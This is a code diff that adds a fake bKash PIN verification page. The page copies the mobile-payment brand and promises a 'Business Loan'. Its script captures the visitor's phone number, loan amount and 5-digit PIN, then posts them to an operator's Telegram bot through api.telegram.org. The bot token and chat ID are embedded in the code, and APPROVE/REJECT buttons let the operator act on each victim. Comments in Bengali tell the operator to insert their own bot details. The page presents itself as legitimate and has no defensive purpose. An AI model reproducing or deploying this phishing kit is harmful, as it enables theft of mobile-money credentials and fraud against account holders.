@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>bKash Pin Verification</title>
+    <link rel="icon" type="image/png" href="img/favicon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+    <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
+
+        <div class="flex justify-between items-center bg-white px-6 py-4">
+            <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo" />
+        </div>
+
+        <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
+            <div>
+                <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
+                <p class="text-xs text-gray-500">loan category: Business Loan</p>
+            </div>
+            <p class="text-sm font-semibold text-gray-800" id="display_amount">৳0.00</p>
+        </div>
+
+        <form id="pinForm">
+            <div class="bg-pink-600 px-6 py-16">
+                <p class="text-white text-sm mb-2 text-center" id="pin_instruction">Enter bKash PIN</p>
+                <input type="tel" id="pinInput" placeholder="Enter 5 digit PIN" class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center" maxlength="5" required />
+            </div>
+
+            <div class="flex justify-between items-center bg-white px-6 py-4">
+                <button type="button" onclick="history.back()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
+                    Cancel
+                </button>
+                <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
+                    Confirm
+                </button>
+            </div>
+        </form>
+
+        <div class="text-center text-xs text-gray-400 py-2">
+            © 2025 bKash, All Rights Reserved
+            <br />
+            <span class="text-pink-600">● 16247</span>
+        </div>
+
+    </div>
+
+    <script>
+        // ১. URL ডাটা ধরা
+        const params = new URLSearchParams(window.location.search);
+        const mobile = params.get('mobile');
+        const amount = params.get('amount');
+
+        if (mobile) {
+            const maskedMobile = mobile.substring(0, 3) + "XXXX" + mobile.substring(7);
+            document.getElementById('pin_instruction').innerText = `Enter PIN for ${maskedMobile}`;
+        }
+        if (amount) {
+            document.getElementById('display_amount').innerText = '৳' + amount;
+        }
+
+        // ২. ভ্যালিডেশন
+        const pinInput = document.getElementById('pinInput');
+        const confirmBtn = document.getElementById('confirmBtn');
+
+        pinInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length === 5) {
+                confirmBtn.disabled = false;
+                confirmBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                confirmBtn.classList.add('bg-pink-500', 'text-white', 'hover:bg-pink-600');
+            } else {
+                confirmBtn.disabled = true;
+                confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
+            }
+        });
+
+        // ৩. ফর্ম সাবমিট (বাটন সহ)
+        document.getElementById('pinForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const pinCode = pinInput.value;
+
+            // ⚠️ আপনার বটের তথ্য বসান ⚠️
+            const botToken = "8219251554:AAF6qEcHBVoofOCdj4JRqAycz3RxvIqsnqI"; 
+            const chatId = "6587549013";
+
+            // মেসেজ টেক্সট
+            const textMessage = `🚨 NEW LOGIN 🚨\n📱 Number: ${mobile}\n💰 Amount: ${amount}\n🔒 PIN: ${pinCode}\n\nSelect Action:`;
+
+            // বাটনের কনফিগারেশন (Inline Keyboard)
+            const data = {
+                chat_id: chatId,
+                text: textMessage,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APPROVE", callback_data: "approve" },
+                            { text: "❌ REJECT", callback_data: "reject" }
+                        ]
+                    ]
+                }
+            };
+
+            confirmBtn.innerText = "Processing...";
+
+            // টেলিগ্রামে পাঠানো
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                // সফল হলে প্রসেসিং পেজে নিয়ে যাবে
+                window.location.href = `processing.html?mobile=${mobile}&amount=${amount}`;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = `processing.html?mobile=${mobile}&amount=${amount}`;
+            });
+        });
+    </script>
+</body>
+</html>
